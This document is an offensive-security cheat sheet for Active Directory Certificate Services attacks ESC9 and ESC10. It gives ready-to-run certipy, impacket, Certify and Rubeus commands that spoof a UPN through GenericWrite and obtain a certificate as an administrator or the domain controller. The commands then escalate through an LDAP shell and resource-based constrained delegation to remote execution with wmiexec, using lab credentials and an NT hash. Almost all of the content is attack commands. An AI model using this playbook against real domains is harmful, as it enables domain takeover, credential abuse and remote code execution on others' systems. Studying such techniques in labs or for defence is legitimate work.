# 13.12 ESC9 ESC10 No Security Extension

> Spoof UPN with GenericWrite to map a cert to a different account — ESC9 (no security extension), ESC10 (weak Schannel binding).

## Overview

ESC9 exploits the CT_FLAG_NO_SECURITY_EXTENSION flag on a template, bypassing strong certificate mapping. ESC10 (Case 1) exploits StrongCertificateBindingEnforcement=0; ESC10 (Case 2) exploits CertificateMappingMethods=0x4 and requires Schannel auth via -ldap-shell. Both rely on GenericWrite/FullControl over an account to spoof its UPN, request a cert mapped to a different target, then revert. ESC9 targets user accounts; ESC10 Case 2 targets machine accounts (e.g., the DC).

## Steps

- Confirm prerequisites: GenericWrite/FullControl over account A, target is account B
- Use certipy shadow auto to get NT hash of account A via Shadow Credentials (avoids changing password)
- Set account A's UPN to match target account B's UPN with certipy account update -upn
- Request a cert as account A using the vulnerable template (or any client-auth template for ESC10)
- Revert account A's UPN back to original with certipy account update
- For ESC10 Case 2 (DC machine account): use certipy auth -ldap-shell then add_computer and set_rbcd
- Use getST.py to impersonate Administrator via RBCD, then wmiexec with KRB5CCNAME
- Check registry keys (if accessible): StrongCertificateBindingEnforcement under Kdc, CertificateMappingMethods under Schannel

## Commands

### certipy shadow auto

```bash
certipy shadow auto -u 'blwasp@lab.local' -p 'Password123!' -account user2
```

### certipy account update UPN to target

```bash
certipy account update -u 'blwasp@lab.local' -p 'Password123!' -user user2 -upn administrator@lab.local
```

### certipy req ESC9 template

```bash
certipy req -u 'blwasp@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template ESC9
```

### certipy account revert UPN

```bash
certipy account update -u 'blwasp@lab.local' -p 'Password123!' -user user2 -upn user2@lab.local
```

### certipy auth ESC9

```bash
certipy auth -pfx user3.pfx -domain lab.local
```

### ESC10 Case 2: update UPN to DC

```bash
certipy account update -u 'blwasp@lab.local' -p 'Password123!' -user user2 -upn 'lab-dc$@lab.local'
```

### ESC10 Case 2: req User template

```bash
certipy req -u 'blwasp@lab.local' -hashes 2b576acbe6bcfda7294d6bd18041b8fe -ca lab-LAB-DC-CA -template User
```

### ESC10 Case 2: ldap-shell auth

```bash
certipy auth -pfx lab-dc.pfx -domain lab.local -dc-ip <TARGET> -ldap-shell
```

### getST RBCD impersonate

```bash
getST.py -spn cifs/LAB-DC.LAB.LOCAL -impersonate Administrator -dc-ip <TARGET> lab.local/'plaintext$':plaintext123
```

### wmiexec with RBCD TGT

```bash
KRB5CCNAME=Administrator.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
```

### reg query StrongCertificateBindingEnforcement

```powershell
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
```

### reg query CertificateMappingMethods

```powershell
reg query HKLM\System\CurrentControlSet\Control\SecurityProviders\Schannel\
```

### reg.py query Kdc key (from Linux)

```bash
reg.py 'lab'/'Administrator':'Password123!'@<TARGET> query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc'
```

### reg.py query Schannel key (from Linux)

```bash
reg.py 'lab'/'Administrator':'Password123!'@<TARGET> query -keyName 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL'
```

### ESC9 Windows (Certify.exe)

```powershell
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC9 /altname:user3
```

### ESC9 Windows: Rubeus asktgt

```powershell
.\Rubeus.exe asktgt /user:user3 /certificate:user3.pfx /getcredentials /nowrap
```
